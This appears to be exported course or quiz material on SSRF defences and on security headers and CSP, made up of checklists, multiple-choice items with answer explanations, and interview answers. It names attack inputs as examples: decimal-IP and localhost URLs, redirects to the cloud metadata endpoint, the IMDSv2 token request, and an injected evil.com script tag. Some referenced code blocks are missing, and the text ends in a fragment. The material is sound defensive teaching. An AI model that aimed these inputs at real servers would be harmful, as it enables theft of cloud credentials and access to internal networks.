prod.summary: In production, SSRF lives in “helpful” features: link previews, avatar-from-URL, webhook senders, PDF and image renderers, and import tools. Seniors treat every outbound request with a user-influenced URL as dangerous and enforce the IP check at the socket level, because string checks on the URL lose to redirects, DNS rebinding and odd IP formats like http://2130706433/.
checklist: Outbound fetches of user URLs go through one hardened client (or an egress proxy such as Smokescreen), never plain fetch().
The resolved IP is checked when connecting, for every redirect hop; private, loopback, link-local, CGNAT and IPv6 ULA ranges are blocked.
Only http: and https: are allowed; file:, gopher: and others are rejected.
Timeouts (connect and total), max response size and max redirects are set, so the feature cannot be used for port scanning or memory exhaustion.
AWS instances require IMDSv2 (HttpTokens=required) with hop limit 1 for containers that should not reach it.
Fetchers run with no cloud credentials and in a network segment that cannot reach internal admin services.
Error messages do not echo the response body or detailed connection errors back to the user (these help attackers map the network).
numbers: Cloud metadata endpoint: 169.254.169.254 on AWS, GCP and Azure (GCP also metadata.google.internal).
IMDSv2 needs a PUT /latest/api/token with header X-aws-ec2-metadata-token-ttl-seconds (max 21600); a simple GET-only SSRF cannot do this.
Undici's fetch (Node's built-in) follows up to 20 redirects by default.
failures: Cloud audit log: the web server's IAM role is used from an unknown IP address.
Classic SSRF to the metadata endpoint returned temporary credentials. Rotate by removing the role session, enforce IMDSv2, and put the URL fetcher behind connect-time IP checks.
Blocklist on hostname is bypassed with http://evil.example that resolves to 127.0.0.1.
The check looked at the string, not the resolved IP. Resolve DNS and check the IP inside the connection's lookup, which also stops DNS rebinding (first answer public, second answer private).
Allowed URL https://good.com/r returns 302 Location: http://169.254.169.254/ and the fetch follows it.
Validation ran only on the first URL. Validate every hop, or enforce the check at connect time so all hops are covered.
Link preview workers hang and memory grows during an incident.
Attackers pointed previews at endless or huge responses. Set a total timeout (e.g. 5 s), stream with a byte limit (e.g. 1 MB), and stop reading after the <head>.

code.title: Connect-time IP check for user-supplied URLs (undici)
code.note: Two layers: lookup checks resolved hostnames, and the custom connect checks IP literals, which Node connects to without any lookup. Tested on Node 22 with undici 8: 127.0.0.1, 2130706433, localhost, [::1] and [::ffff:127.0.0.1] are blocked; public hosts work.

qs.s: Your SSRF filter resolves the hostname, checks the IP is public, then calls fetch(url). An attacker uses a domain with a 0-second DNS TTL that answers a public IP first and 127.0.0.1 second. What happens?
o: The check fails safely
The fetch resolves the name again, gets 127.0.0.1 and reaches localhost (DNS rebinding); check the IP at connect time instead
DNS caching in Node prevents this
HTTPS stops it
qs.e: Check-then-use with two separate DNS lookups is a race. Enforce the check in the lookup used by the actual connection, or pin the connection to the checked IP.

qs.s: On AWS, which setting most directly stops a simple GET-based SSRF from reading instance credentials?
o: Requiring IMDSv2 (HttpTokens=required), because it needs a PUT with a special header to get a session token first
Enabling CloudTrail
Using a private subnet
Encrypting the EBS volume
qs.e: A typical SSRF can only make the server do a GET with a URL. IMDSv2 requires a PUT and a custom header, which most SSRF bugs cannot produce. Private subnets do not help, because the metadata service is reachable from the instance itself.

qs.s: A webhook feature lets customers set any callback URL. Which design is the safest at scale?
o: Block the string localhost in the URL
Allow only URLs ending in .com
Let customers whitelist their own IPs
Send webhooks from isolated workers through an egress proxy that blocks internal ranges, with timeouts and no cloud credentials on those workers
qs.e: Webhook senders must reach arbitrary public hosts, so allowlists of destinations do not fit. Isolation plus a proxy that enforces IP rules limits what any bypass can reach.

qs.s: A teammate adds the last rule “to be safe”. What does this print, and what happens to the link-preview feature?

code.title: blocklist.ts

o: false; the feature works normally
An error, because IPv4 and IPv6 rules cannot be mixed
true: BlockList compares IPv4 addresses as IPv4-mapped IPv6, so ::ffff:0:0/96 matches every IPv4 address and the preview feature blocks all IPv4 sites
false, but IPv6 sites stop working
qs.e: Node's BlockList treats an IPv4 address and its ::ffff: form as the same address in both directions. That is also why you do not need the rule: ::ffff:127.0.0.1 is already caught by the 127.0.0.0/8 rule. This exact bug fails closed, so it shows up as “previews broken”, not as a breach; always test a public URL too.

qs.s: Your fetcher uses a custom DNS lookup that rejects private IPs. An attacker submits http://127.0.0.1:6379/. What happens?

code.title: fetcher.ts

o: The request reaches the service on localhost: Node connects to IP literals directly and never calls lookup. Check IP literals separately (for example in a custom connect function) for every hop
It is blocked, because safeLookup sees 127.0.0.1
It fails, because fetch only allows port 80 and 443
It is blocked, because Redis does not speak HTTP
qs.e: DNS hooks only run for names. URL forms like http://2130706433/ are also normalised to an IP literal by the URL parser, so they skip the hook as well. Modern Redis drops connections that look like HTTP, but most internal services (admin panels, search clusters, internal APIs) have no such guard. fetch blocks some “bad ports”, but 6379 is not among them.

qs.s: Your invoice PDF service renders customer-provided HTML with headless Chrome on an EC2 instance. Which risk is easy to miss?
o: Only XSS in the generated PDF
None, because the browser runs in a sandbox
Fonts may render differently

The browser itself fetches every <img>, <iframe> and CSS URL in the HTML, from inside your network, so it can reach the metadata service and internal hosts. Run it with no cloud credentials, in an isolated network or through an egress proxy, and block or intercept requests to anything not allowlisted
qs.e: HTML-to-PDF renderers are SSRF engines: the resulting PDF can even show the internal response. The Chrome sandbox protects the host from the page's code, not your network from the page's requests.

qs.s: Your webhook feature lets customers choose the HTTP method and custom headers. The fleet runs on EC2 with IMDSv2 required. Is the metadata service safe from this feature?
o: Yes; IMDSv2 always stops SSRF

No: the attacker can send the PUT with the X-aws-ec2-metadata-token-ttl-seconds header and get a token. Block 169.254.169.254 in the sender (IP check or egress proxy), and run senders without useful IAM roles
Yes, because webhooks run over HTTPS
No, but only if the instance is in a public subnet
qs.e: IMDSv2 defeats SSRF that can only do simple GETs. A feature that lets users choose method and headers can perform the full token dance. Defence in depth: connect-time IP blocking, an egress proxy, a hop limit of 1 for containers that do not need IMDS, and minimal instance roles.

interview.q: Design a link-preview service that fetches URLs users paste into chat.
answer: Run it as a separate service with no cloud credentials, in a network segment that cannot reach internal services; ideally all outbound traffic goes through an egress proxy (e.g. Smokescreen) that enforces IP rules.
Allow only http(s) and ports 80/443; check resolved IPs at connect time for every hop, including IP literals.
Limits: connect and total timeouts, max redirects, max bytes read, only parse <head> metadata.
Do not return raw bodies or detailed errors to users; cache results per URL to reduce load and abuse.
Rate limit per user, and fetch images through the same safe client (or not at all).
followups: How do you handle DNS rebinding?
What would you log for incident response?

interview.q: Why is validating the URL string not enough to stop SSRF? Name the bypasses.
answer: DNS: a public-looking hostname can resolve to a private IP, and a 0-TTL record can change between check and use (rebinding).
Redirects: an allowed URL can redirect to an internal one.
Alternate IP forms: decimal (2130706433), octal, short forms, IPv6 and IPv4-mapped IPv6.
Parser differences: the validator and the HTTP client may parse user@host, backslashes or odd encodings differently.
Fix: decide on the IP the socket actually connects to, for every connection, and never trust a pre-check followed by a separate fetch.
followups: How would you test your filter?
Where does an egress proxy beat in-app checks?

interview.q: How do you use the OWASP Top 10 in a team, and what are its limits?
answer: It is an awareness list, ranked from data and community input; good for training, review checklists and shared vocabulary.
The 2025 edition: Broken Access Control stays #1 and now includes SSRF; Software Supply Chain Failures (A03) and Mishandling of Exceptional Conditions (A10) are new.
It is not a testing standard. For requirements and verification, use OWASP ASVS (version 5.0 since May 2025) and, for APIs, the OWASP API Security Top 10.
Map each item to concrete controls in your stack (e.g. A01 → scoped queries + two-tenant tests).
Limits: it says nothing about your threat model, business logic abuse or priorities; do threat modelling per feature.
followups: Which Top 10 item is most relevant to our product?
How would you run a lightweight threat model?

one: HTTP response headers that tell browsers to enforce extra protections: which scripts may run, whether the page can be framed, HTTPS only, and so on.
an: House rules posted at the entrance that the building's own security guards (the browser) enforce for you.
how: Content-Security-Policy: controls where scripts, styles, images and connections may come from. The recommended form is a strict CSP: script-src 'nonce-RANDOM' 'strict-dynamic' plus object-src 'none'; base-uri 'none'. Long host allowlists are often bypassable (one allowed CDN can host attacker scripts).
Strict-Transport-Security: always use HTTPS for this domain. X-Frame-Options / CSP frame-ancestors: prevent clickjacking. X-Content-Type-Options: nosniff. Referrer-Policy. Permissions-Policy.
Roll out CSP in Report-Only mode first to see what would break.
why: Cheap, broad protection configured once at the proxy or framework level.
trade: A strict CSP breaks third-party widgets and inline scripts until you adapt them. Start with report-only and iterate.

myth.r: They are a few lines of config that remove whole attack categories for any site.

q.s: How do you introduce a strict CSP on a large existing app without breaking production?
o: Enforce it immediately
Deploy it as Content-Security-Policy-Report-Only, collect violations, fix, then enforce
Only in development
Use CORS instead
q.e: Report-only shows what would break with zero user impact.

lab: Scan a site you own with securityheaders.com and Mozilla Observatory.
Add a CSP in Report-Only mode with a reporting endpoint, browse the site, and read the violations.
Move to an enforced nonce-based CSP.

plain: Security headers are instructions your server sends with every page, telling the browser to apply extra protections. The most powerful is Content Security Policy (CSP): a list of where scripts, styles and other resources may come from. Scripts from anywhere else are blocked, even if an attacker injects them.
bridge: If you have seen console errors like “Refused to load the script because it violates the Content Security Policy”, that was CSP protecting the page.

walk.title: Rolling out CSP without breaking the site
steps: Start with Content-Security-Policy-Report-Only: script-src 'nonce-{random}' 'strict-dynamic'; object-src 'none'; base-uri 'none'; report-to csp. Nothing is blocked yet; violations are reported.
Browse the site and read the reports: an inline script in the HTML, an onclick= attribute, a chat widget loaded by a script without the nonce.
Generate a new random nonce on every response and add it to your own <script> tags. Move inline event handlers into JS files. 'strict-dynamic' lets your trusted scripts load their own dependencies.
When reports go quiet, switch the header name to Content-Security-Policy to enforce it.
Now an injected <script src="https://evil.com/x.js"> has no valid nonce and is blocked by the browser.

terms: Content Security Policy: allowed sources for scripts and other resources.
A random value per page that marks your own inline scripts as allowed.
Header forcing browsers to always use HTTPS for your domain.
Hiding your page in an invisible frame to trick clicks; blocked with frame-ancestors.
insights: CSP is the strongest second line of defence against XSS.
'unsafe-inline' in script-src without a nonce gives almost no XSS protection. Treat adding it as a security regression, not a quick fix.
Set headers in one place (edge or framework) and test them in CI; per-route headers drift and miss error pages and static files.

prod.summary: In production, security headers are set once at the edge (CDN, reverse proxy) or in the framework, and then drift: a new widget needs an exception, someone adds 'unsafe-inline', HSTS gets a long max-age before every subdomain supports HTTPS. Seniors check the real response headers, prefer a nonce-based strict CSP over host allowlists, and keep a reporting endpoint so they see breakage before users do.
checklist: CSP is enforced (not only Report-Only) and uses nonces or hashes; no 'unsafe-inline' or 'unsafe-eval' in script-src.
Nonces are random per response (at least 128 bits) and never cached in shared HTML; a CDN-cached page with a fixed nonce is a broken CSP.
object-src 'none', base-uri 'none' (or 'self') and frame-ancestors are set.
HSTS max-age grows in steps (5 minutes → 1 week → 1 year); includeSubDomains and preload only after every subdomain serves HTTPS.
X-Content-Type-Options: nosniff and Referrer-Policy: strict-origin-when-cross-origin are present on all responses, including errors and static files.
CSP violation reports go to an endpoint with sampling and alerting, and are filtered for browser-extension noise.
Headers are tested in CI (e.g. a test that fetches / and asserts the header values).
numbers: HSTS preload list (hstspreload.org) requires max-age of at least 31536000 (1 year), includeSubDomains and preload.
Content-Security-Policy-Report-Only cannot be set in a <meta> tag; it only works as an HTTP header. frame-ancestors is also ignored in meta tags.
Browsers' default Referrer-Policy is strict-origin-when-cross-origin when none is set.
X-XSS-Protection is deprecated; modern browsers removed the XSS auditor, so set it to 0 or leave it out.
failures: After enabling CSP, the console shows Refused to execute inline script because it violates the following Content Security Policy directive and the page is blank.

Inline scripts (often framework bootstrapping) have no nonce. Pass the per-request nonce to the framework (Next.js reads it from the CSP header set in proxy.ts) or use hashes for static inline scripts.
CSP works in staging but every script is blocked in production.

The CDN caches HTML with one nonce while the header carries a new one (or the reverse). Nonce-based pages must be dynamic or have header and body generated together; for static pages, use hash-based CSP.
A subdomain like legacy.example.com stops loading for everyone after an HSTS change.
includeSubDomains forced HTTPS on a subdomain without a certificate. Fix TLS on the subdomain; browsers remember HSTS until max-age expires, so rollback is slow.
Thousands of CSP reports per minute fill the logging budget.
Browser extensions and a third-party script cause noise. Sample reports, drop known extension schemes (chrome-extension:), and group by directive and blocked URL.

code.title: Nonce-based strict CSP in Next.js 16 proxy.ts
code.note: A nonce makes pages dynamic: they cannot be served from a static cache with the same nonce. That is the main cost of a strict CSP.

qs.s: Your CSP is script-src 'self' https://cdn.jsdelivr.net. An attacker finds an HTML injection. Why might the CSP not stop them?
o: CSP never applies to injected HTML
'self' blocks all external scripts
They can load any file published to that public CDN (including their own package or an old library with a known gadget), so the allowlist is bypassable
jsDelivr does not support CSP
qs.e: Host allowlists trust everything on the host. Public CDNs host code from anyone. A nonce-based CSP trusts specific script tags instead of whole domains.

qs.s: You add Strict-Transport-Security: max-age=63072000; includeSubDomains; preload on day one and submit to the preload list. Next week you find intranet.example.com only works on HTTP. What is the consequence?
o: None, preload only affects the main domain
Browsers will refuse HTTP for that subdomain; removing yourself from the preload list and from browser caches takes months
The header is ignored until you renew the certificate
HSTS only applies to POST requests
qs.e: HSTS with includeSubDomains covers all subdomains, and preload ships inside browsers. Roll out max-age in steps and only add preload when every subdomain is HTTPS-ready.

qs.s: Marketing wants a new analytics snippet. Your strict CSP uses 'nonce-…' 'strict-dynamic'. What is the correct way to add it?
o: Add the snippet's script tag with the per-request nonce; scripts it loads are then trusted through strict-dynamic
Add 'unsafe-inline' to script-src
Turn CSP back to Report-Only permanently
Add * to script-src for that page
qs.e: With strict-dynamic, trust flows from nonced scripts to scripts they load. Adding 'unsafe-inline' or * would remove most XSS protection. Remember the snippet itself is now trusted code: review it like a dependency.

qs.s: Your policy keeps 'unsafe-inline' “for old browsers”. An attacker injects an inline <script> without a nonce. Does it run in a current browser?

code.title: Response header
code.src: Content-Security-Policy: script-src 'nonce-7Hq2vX0b9mQ1' 'strict-dynamic' 'unsafe-inline' https:; object-src 'none'; base-uri 'none'

o: No: when a nonce (or hash) is present, CSP Level 2+ browsers ignore 'unsafe-inline', and 'strict-dynamic' makes them ignore https: too. Those keywords are only fallbacks for very old browsers
Yes, because 'unsafe-inline' allows all inline scripts
Yes, but only in Firefox
No, because object-src 'none' blocks inline scripts
qs.e: This is the backward-compatible strict CSP that Google recommends. Modern browsers enforce only the nonce; ancient ones fall back to the weaker keywords instead of breaking. object-src controls plugins, not scripts.

qs.s: Your marketing site is fully static and served from a CDN. It has two small inline scripts. How do you get a strict CSP?
o: Use a nonce that you hard-code into the HTML at build time
Add 'unsafe-inline'; static sites cannot use strict CSP
Use a host allowlist of your CDN domain
Use hashes: add 'sha256-…' for each inline script (computed at build time) plus 'strict-dynamic', and set the header at the CDN
qs.e: A nonce must be new and unpredictable on every response; a hard-coded one is a password printed on the page. Hashes fit static HTML because the script content is fixed. Any change to a script changes its hash, so generate the header in the build.

qs.s: A partner must embed your dashboard in an iframe. You send both headers below. What happens in a current browser on https://partner.example?

code.title: Response headers
code.src:
Content-Security-Policy: frame-ancestors 'self' https://partner.example
X-Frame-Options: DENY

o: The embed is blocked, because DENY always wins
The browser shows an error and blocks all framing
The embed works: when frame-ancestors is present, browsers ignore X-Frame-Options. Still remove the conflicting header to avoid confusion and odd behaviour in old clients
The embed works only for same-origin pages
qs.e: The CSP specification says frame-ancestors replaces X-Frame-Options when both are present. XFO cannot express an allowlist of origins, which is why frame-ancestors exists.

qs.s: Your report endpoint receives many reports like this from the checkout page, and marketing says checkout analytics stopped. What is the right fix?

code.title: CSP report (Reporting API)

o: Add 'unsafe-inline' to script-src for the checkout page only

Your own inline analytics bootstrap has no nonce on this page. Render it with the per-request nonce (for example via your framework's Script component); scripts it loads are then allowed by 'strict-dynamic'
Switch the checkout page to Report-Only permanently
Ignore it; it is browser-extension noise
qs.e: The sample shows the script is your tag-manager bootstrap, not an extension. Fix the template so every inline script carries the nonce. Adding 'unsafe-inline' (which nonces would override anyway in modern browsers) or leaving checkout unprotected weakens your most sensitive page.

interview.q: How would you roll out CSP on a large existing app with many third-party scripts?
answer: Inventory scripts first: your bundles, inline bootstraps, tag manager, widgets.
Start with a strict policy in Content-Security-Policy-Report-Only (nonce + strict-dynamic, object-src 'none', base-uri 'none') and a reporting endpoint with sampling.
Fix by category: add nonces to inline scripts, move inline event handlers to code, ask vendors for CSP-compatible snippets.
Enforce page by page or route group, keeping Report-Only for the next stricter step.
Keep it from rotting: headers tested in CI, alerts on report spikes, a review process for new third-party scripts.
Trade-off: per-request nonces make HTML uncacheable at a shared CDN; static pages use hashes instead.
followups: How do you filter extension noise in reports?
What does a tag manager do to your CSP?

interview.q: Nonces, hashes, or host allowlists: when would you use each?
answer: Nonces: server-rendered pages where you can generate a random value per response; easiest for dynamic apps (Next.js reads it from the header).
Hashes: static or cached HTML with fixed inline scripts; computed at build time.
'strict-dynamic' with either: lets trusted scripts load their dependencies without listing hosts.
Host allowlists: mostly for non-script directives (img-src, connect-src); for scripts they are often bypassable through JSONP endpoints or libraries on allowed hosts.
Avoid 'unsafe-inline'/'unsafe-eval' in script-src except as fallbacks next to nonces.
followups: Can a nonce leak?
How do you handle a library that uses eval?

interview.q: Which security headers do you set on every response, and which are obsolete?
answer: Strict-Transport-Security (grow max-age in steps; preload only when every subdomain is HTTPS).
Content-Security-Policy with frame-ancestors (clickjacking) and a strict script-src.
X-Content-Type-Options: nosniff; Referrer-Policy: strict-origin-when-cross-origin or stricter; Permissions-Policy to switch off camera, microphone, geolocation if unused.
Obsolete: X-XSS-Protection (set to 0 or omit), Expect-CT, HPKP (Public-Key-Pins).
Apply them at one layer (edge or app), including on error pages and static files, and test in CI.
followups: What do COOP and COEP add?
Why can HSTS preload be hard to undo?

flowchart TD

  B --> Q{"Has nonce R4nd0m?"}
